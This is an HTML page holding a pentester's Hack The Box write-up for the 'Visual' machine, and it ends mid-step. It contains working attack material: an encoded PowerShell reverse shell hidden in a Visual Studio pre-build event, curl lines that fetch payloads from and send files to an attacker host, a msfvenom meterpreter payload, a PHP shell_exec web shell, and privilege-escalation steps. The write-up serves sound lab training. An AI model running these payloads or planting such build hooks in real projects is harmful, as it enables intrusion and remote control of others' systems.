@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Visual</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/visual/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Windows">← All Windows write-ups</a>
+                    <h1 data-type="Visual" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Medium">Medium</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <blockquote>Active box: 45 points or smth</blockquote>
+
+<h2>Discover</h2>
+
+<details>
+<summary>Nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -v -T4 -p0- 10.10.11.234</code></p><pre><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: Visual - Revolutionizing Visual Studio Builds
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+
+</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Web</summary>
+<div class="inner">
+<p>port 80:</p><figure><img src="../assets/images/htb/visual/01-untitled.png" alt=""></figure><p>Looking to the requests:</p><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.11.234 - [09/Oct/2023 20:33:01] code 404, message File not found
+10.10.11.234 - [09/Oct/2023 20:33:01] "GET /info/refs?service=git-upload-pack HTTP/1.1" 404</code></pre><p>Listening on port:</p><pre><code>listening on [any] 80 ...
+10.10.11.234: inverse host lookup failed: Unknown host
+connect to [10.10.14.167] from (UNKNOWN) [10.10.11.234] 51165
+GET /info/refs?service=git-upload-pack HTTP/1.1
+Host: 10.10.14.167
+User-Agent: git/2.41.0.windows.1
+Accept: */*
+Accept-Encoding: deflate, gzip, br, zstd
+Pragma: no-cache
+Git-Protocol: version=2</code></pre>
+</div>
+</details>
+
+<h2>Obtain reverse shell</h2>
+
+<h3>find out how to upload to server</h3>
+
+<blockquote>When running a python webserver with the ‘http.server’ module we can see all incomming requests. We can see the following request: <code>"GET /info/refs?service=git-upload-pack HTTP/1.1" 404</code> On the site it also asks to supply a git repo. So it probably tries to clone a repo and compiles the code</blockquote>
+
+<figure><p><a href="https://theartofmachinery.com/2016/07/02/git_over_http.html" target="_blank" rel="noopener noreferrer">A Quick and Hacky Way to Serve a Git Repo over HTTP - The Art of Machinery</a> - More and more development tools are supporting git repository URLs as a way of pointing to code or data. That’s convenient if you’re working with a mature, third-party repository that’s already hosted, but it means that sometimes you just need a quick way to serve a repo over a web interface for experimental work.</p></figure>
+
+<p><strong>Following commands can be used to make our webserver act like a repo (so it can be cloned):</strong></p>
+
+<pre><code>cd .git
+git --bare update-server-info
+mv hooks/post-update.sample hooks/post-update
+python3 -m http.server 8080</code></pre>
+
+<h3>Creating payload</h3>
+
+<figure><p><a href="https://stackoverflow.com/questions/22611951/untrustworthy-projects-in-visual-studio/22612143#22612143" target="_blank" rel="noopener noreferrer">Untrustworthy Projects in Visual Studio?</a> - When opening a project you may have recently downloaded, Visual Studio 2013 briefly warns you to only open projects from trustworthy sources. What are some of the risks to opening projects? Can a p...</p></figure>
+
+<details>
+<summary>Executing code upon compile</summary>
+<div class="inner">
+<p><strong>Pre- and Post-Build Events</strong></p><p>In it's simplest form, untrusted projects could execute a Pre-Build event that would delete files. Or worse. Just about anything can be executed within a Build event. This is the 101 stuff that happens on Compile.</p><p><strong>Executions on Project Open</strong></p><p>Visual Studio project files are nothing more than big MSBuild configurations. There are a few MSBuild targets that Visual Studio executes when you open a project, all to support the tooling. These targets include Compile, ResolveAssemblyReferences, ResolveCOMReferences, GetFrameworkPaths, and CopyRunEnvironmentFiles. If any of these targets exist, the tasks within them are also executed. Delete files, or worse.</p><p>See: 'Design-Time Execution' at <a href="http://msdn.microsoft.com/en-us/library/ms171468.aspx">http://msdn.microsoft.com/en-us/library/ms171468.aspx</a></p><p><strong>IntelliSense</strong></p><p>Part of that <em>tooling</em> mentioned above includes IntelliSense, which executes the <code>Compile</code>task within MSBuild; the CSC/VBC must be executed to get all of the IntelliSense functionality. Because of the nature of IntelliSense, this task is repeatedly executed as you work, rather than the opportunities above that are just run once on open.</p><p>See: 'Design-Time IntelliSense' at <a href="http://msdn.microsoft.com/en-us/library/ms171468.aspx">http://msdn.microsoft.com/en-us/library/ms171468.aspx</a></p><p><strong>Hidden Elsewhere in MSBuild</strong></p><p>There is a sea of other routine MSBuild targets that you will manually execute throughout your day, including Build, Rebuild, Test, and Clean. yes, keep in mind that even <code>clean</code> is a build target, so <code>Clean</code> could delete more than just your old <code>\bin</code> directories.</p><p><strong>NuGet</strong></p><p>Malicious projects may also expose systems via NuGet. Though Package Restore would not be an issue, the <code>packages.config</code> could specify a different Repository Source. Then, when you install a new package, such as <code>install-package jquery</code>, NuGet will retrieve the jQuery package from the untrusted alternate, rather than from nuget.org. This malicious jQuery package could have all sorts of other 'Goodies' within it that would be executed as a part of <br>the package installation.</p><p>This is not a security vulnerability from NuGet, because "you" specified an alternate package source; this is by design, such as Corporations that have their own internal package repository.</p>
+</div>
+</details>
+
+<h4>Try1: Pre-build event code execution</h4>
+
+<figure><p><a href="https://github.com/MicrosoftDocs/visualstudio-docs/blob/main/docs/ide/reference/build-events-page-project-designer-csharp.md" target="_blank" rel="noopener noreferrer">Build Events Page (Project Designer) · MicrosoftDocs/visualstudio-docs</a></p></figure>
+
+<ol><li>Create a C# .NET 6.0 project in visual studio 2022</li>
+<li>Add a <code>&lt;PrebuildEvent&gt;</code>tag:<pre data-lang="xml"><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
+
+  &lt;PropertyGroup&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
+    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
+    &lt;Nullable&gt;enable&lt;/Nullable&gt;
+    &lt;PreBuildEvent&gt;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&lt;/PreBuildEvent&gt;
+  &lt;/PropertyGroup&gt;
+
+&lt;/Project&gt;</code></pre><ul><li>Hacktricks oneliner → <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#powershell">https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#powershell</a></li><li>Convert to base (using powershell) → <code>[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('cmd'))</code></li><li>In visual studio create a local git repo<figure><img src="../assets/images/htb/visual/02-untitled-1.png" alt=""></figure></li><li>In windows vm &gt; save &gt; create zip and upload to debian VM (attackbox)</li></ul></li></ol>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="⚠️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="ce07aa1f-5b71-4d3a-b830-c650bc15ac8c" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="⚠️"></span></div><div style="width:100%">Also possible to use a dropper (like bobbafett.ps1)</div></aside>
+
+<h3>Initial access</h3>
+
+<ol><li>cd to the .git folder</li>
+<li>setup webserver →  </li>
+<li>The pre-build event is executed on the server and we have a reverse shell<ul><li>user: visual\enox</li><li><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → <strong>e072347fdadfc9d402fa00a5a9e55f1e</strong></li></ul></li></ol>
+
+<h2>Priv escalation</h2>
+
+<h3>winPEAS</h3>
+
+<p><a href="../assets/files/htb/visual/out.txt" download="">out.txt (winPEAS output)</a></p>
+
+<p>Upload and run:</p>
+
+<pre><code>curl http://10.10.16.2:8080/winPEASany.exe -o wp.exe
+.\wp.exe &gt; out.txt</code></pre>
+
+<p>Download:</p>
+
+<pre><code>curl.exe -i -F file=@out.txt http://10.10.16.2:8080</code></pre>
+
+<details>
+<summary>Interesting stuff</summary>
+<div class="inner">
+<p>Permissions over edge?</p><pre><code>[+] Installed Applications --Via Program Files/Uninstall registry--
+   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+    C:\Program Files (x86)\Microsoft Visual Studio\Installer
+    C:\Program Files (x86)\Microsoft\EdgeWebView\Application
+    ==&gt;  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\SetupMetrics\20230610104140166_2056.pma (Authenticated Users [DeleteSubdirectoriesAndFiles])
+    ==&gt;  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\SetupMetrics\20230919030033394_2992.pma (Authenticated Users [DeleteSubdirectoriesAndFiles])</code></pre><p>Permissions over xampp apache webserver:</p><pre><code>[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    ApacheHTTPServer(Apache Software Foundation - Apache HTTP Server)["C:\Xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running
+    YOU CAN MODIFY THIS SERVICE: AppendData/CreateDirectories
+    File Permissions: Everyone [AllAccess]
+    Possible DLL Hijacking in binary folder: C:\Xampp\apache\bin (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
+    Apache/2.4.56 (Win64)</code></pre><p>Logged in users:</p><pre><code>[+] Ever logged users
+    VISUAL\Administrator
+    VISUAL\enox</code></pre><p>Permission tokens:</p><pre><code>[+] Current Token privileges
+   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED</code></pre><p>Known vulnerabilities for this OS:</p><pre><code>[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+    OS Build Number: 17763
+       [!] CVE-2019-0836 : VULNERABLE
+        [&gt;] https://exploit-db.com/exploits/46718
+        [&gt;] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+
+       [!] CVE-2019-0841 : VULNERABLE
+        [&gt;] https://github.com/rogue-kdc/CVE-2019-0841
+        [&gt;] https://rastamouse.me/tags/cve-2019-0841/
+
+       [!] CVE-2019-1064 : VULNERABLE
+        [&gt;] https://www.rythmstick.net/posts/cve-2019-1064/
+
+       [!] CVE-2019-1130 : VULNERABLE
+        [&gt;] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+       [!] CVE-2019-1253 : VULNERABLE
+        [&gt;] https://github.com/padovah4ck/CVE-2019-1253
+
+       [!] CVE-2019-1315 : VULNERABLE
+        [&gt;] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+       [!] CVE-2019-1385 : VULNERABLE
+        [&gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg
+
+       [!] CVE-2019-1388 : VULNERABLE
+        [&gt;] https://github.com/jas502n/CVE-2019-1388
+
+       [!] CVE-2019-1405 : VULNERABLE
+        [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/</code></pre>
+</div>
+</details>
+
+<h3>trying public exploits</h3>
+
+<p>Tried:</p>
+
+<ul><li>SharpByeBear</li><li>CVE-2019-0836</li><li>…</li></ul>
+
+<p>→ no luck</p>
+
+<h3>xammp apache server</h3>
+
+<blockquote>While running WinPeas, we found that we have full access to the <code>c:\xampp</code> folder, which is where Apache is hosted. This means we can create our own webpages. Additionally, ChatGPT provided guidance on how to execute shell commands directly.</blockquote>
+
+<pre><code>$output = shell_exec("your_command_here");
+echo $output;</code></pre>
+
+<ol><li>create a php file that executes the whoami command<pre><code>&lt;?php
+  $output = shell_exec("whoami");
+  echo $output;
+?&gt;</code></pre></li>
+<li>put it in the <code>c:\xampp\htdocs</code> folder (this is where pages are stored</li>
+<li>Access the URL, and you'll notice that commands are executed under a different user, namely <code>NT AUTHORITY\Local Service</code>.<figure><img src="../assets/images/htb/visual/03-untitled-2.png" alt=""></figure><p>→ We are in the path <code>C:\xampp\htdocs</code></p></li>
+<li>lets try establishing a reverse shell for this user<ul><li>Try1: metasploit<pre><code>msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.16.2
+run
+
+# create and upload payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f exe &gt; shell-x64.exe
+curl http://10.10.16.2:8080/shell-x64.exe -o shell.exe
+
+# modify the php file to execute the code and browse to it</code></pre><figure><img src="../assets/images/htb/visual/04-untitled-3.png" alt=""></figure><p>→ Works 🙂&nbsp;we now have <code>NT AUTHORITY\LOCAL SERVICE</code></p></li></ul><ol><li>Running winpeas as this user<pre><code>meterpreter&gt; shell
+powershell "curl http://10.10.16.2:8080/winPEASany.exe -o wp.exe"
+powershell ".\wp.exe &gt; out.txt"
+powershell "curl.exe -i -F file=@out.txt http://10.10.16.2:8080"</code></pre><details>
+<summary>OpenSSH service</summary>
+<div class="inner">
+<pre><code>ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
+    YOU CAN MODIFY THIS SERVICE: AppendData/CreateDirectories, Start
+    Agent to hold private keys used for public key authentication.</code></pre>
+</div>
+</details><details>
+<summary>Token privs</summary>
+<div class="inner">
+<figure><p><a href="https://labs.portcullis.co.uk/blog/se-and-you/" target="_blank" rel="noopener noreferrer">Se* and you - Portcullis Labs</a> - Inspired by GRSecurity‘s analysis of the Linux capabilities model, I thought I’d take a quick look at how Windows fares. The following is a brief analysis of the threats associated with each Se* privilege.</p></figure><pre><code>SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED</code></pre>
+</div>
+</details><details>
+<summary>groups</summary>
+<div class="inner">
+<pre><code>Current user: LOCAL SERVICE
+Current groups: Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, Local, S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263, S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331, S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067, S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053, S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462</code></pre>
+</div>
+</details></li></ol><h2>Restore seImpersonation priv tokens</h2><blockquote>Apparently, the service accounts <code>NT AUTHORITY\LOCAL SERVICE</code> and <code>NT AUTHORITY\NETWORK SERVICE</code> can be exploited to give their permissions ‘back’. By making use of new scheduled tasks etc.</blockquote><figure><p><a href="https://itm4n.github.io/localservice-privileges/" target="_blank" rel="noopener noreferrer">Give Me Back My Privileges! Please?</a> - I want to tell you the story of a service account which lost all its powers (a.k.a. privileges). Windows world is getting increasingly ruthless and when the system considers you are not worthy, this is what happens. Fortunately for our service account, all is not lost, there’s still hope. In this merciless world, you can always turn to the old sages to find some comfort and support. Among them, the Task Scheduler might be willing to help and restore what was lost, provided that you ask kindly…</p></figure><blockquote>I found a tool on github that automates this process:</blockquote><p><a href="https://github.com/itm4n/FullPowers" target="_blank" rel="noopener noreferrer">https://github.com/itm4n/FullPowers</a></p><ol><li>Upload binary<p><code>curl http://10.10.16.2:8080/FullPowers.exe -o FullPowers.exe</code></p></li>
+<li>Execute (for some reason only worked in metasploit shell)<pre><code>C:\Windows\ServiceProfiles\LocalService&gt;FullPowers.exe
+FullPowers.exe
+[+] Started dummy thread with id 4900
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
